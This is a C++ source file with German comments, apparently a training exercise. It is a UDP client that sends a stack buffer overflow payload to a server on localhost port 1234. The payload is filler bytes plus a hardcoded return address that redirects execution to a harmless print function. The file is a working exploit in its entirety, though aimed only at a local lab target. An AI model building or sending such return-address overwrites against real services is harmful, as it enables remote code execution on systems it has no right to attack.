#include <arpa/inet.h>  // Für inet_pton und Adresskonvertierungen
#include <cstdint>      // Für uint*_t Datentypen
#include <cstring>      // Für memset
#include <iostream>     // Für Ein-/Ausgabe
#include <netinet/in.h> // Für sockaddr_in und Netzwerkfunktionen
#include <sys/socket.h> // Für socket, sendto und andere Socket-Funktionen
#include <unistd.h>     // Für close

#define SERVER_IP "127.0.0.1" // Ziel-IP-Adresse (localhost)
#define SERVER_PORT 1234      // Ziel-Port
#define PAYLOAD_SIZE 256      // Größe des zu sendenden Buffers
#define OFFSET_TO_RETURN 248  // Position der Rücksprungadresse im Buffer

void print_abracadabra()
    __attribute__((noinline)); // Verhindert Compiler-Optimierung

// Funktion, die bei erfolgreichem Exploit aufgerufen wird
void print_abracadabra() { std::cout << "abracadabra" << std::endl; }

int main() {
  // UDP-Socket erstellen
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    perror("Socket erstellen fehlgeschlagen");
    return 1;
  }

  // Ziel-Serveradresse einrichten
  sockaddr_in server_addr = {};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT); // Port in Netzwerkbyte-Reihenfolge
  inet_pton(AF_INET, SERVER_IP,
            &server_addr.sin_addr); // IP-Adresse konvertieren

  // Payload vorbereiten
  char payload[PAYLOAD_SIZE];
  memset(payload, 'A',
         OFFSET_TO_RETURN); // Fülle den Buffer mit Junk-Daten bis zum Offset

  uintptr_t func_addr = 0x401206;
  // Debug-Ausgabe: Überprüfe die berechnete Adresse
  std::cout << "[DEBUG] Berechnete Adresse von print_abracadabra im Client: 0x"
            << std::hex << func_addr << std::dec << std::endl;

  *(uintptr_t *)(payload + OFFSET_TO_RETURN) = func_addr;
  std::cout << "[DEBUG] Payload-Inhalt vor dem Senden:" << std::endl;
  for (int i = 0; i < PAYLOAD_SIZE; i++) {
    std::cout << "0x" << std::hex << (unsigned int)(unsigned char)payload[i]
              << " ";
    if ((i + 1) % 16 == 0)
      std::cout << std::endl;
  }

  // Payload an den Server senden
  sendto(sockfd, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr,
         sizeof(server_addr));

  // Debug-Ausgabe: Gesendete Rücksprungadresse
  std::cout << "[DEBUG] Gesendete Rücksprungadresse: 0x" << std::hex
            << func_addr << std::dec << std::endl;

  // Socket schließen
  close(sockfd);

  return 0;
}
